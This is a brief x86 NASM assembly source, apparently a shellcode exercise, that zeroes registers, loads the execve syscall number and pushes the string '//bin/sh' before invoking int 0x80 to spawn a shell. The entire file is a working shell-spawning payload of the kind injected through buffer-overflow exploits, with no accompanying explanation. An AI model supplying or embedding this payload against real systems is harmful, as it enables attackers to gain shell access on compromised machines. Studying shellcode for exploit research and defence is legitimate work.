; nasm -f elf32 shellcode2.s -o shellcode

section .text

	xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    mov al, 0xb

    push ebx
    push `n/sh`
    push `//bi`

    mov ebx, esp

    int 0x80
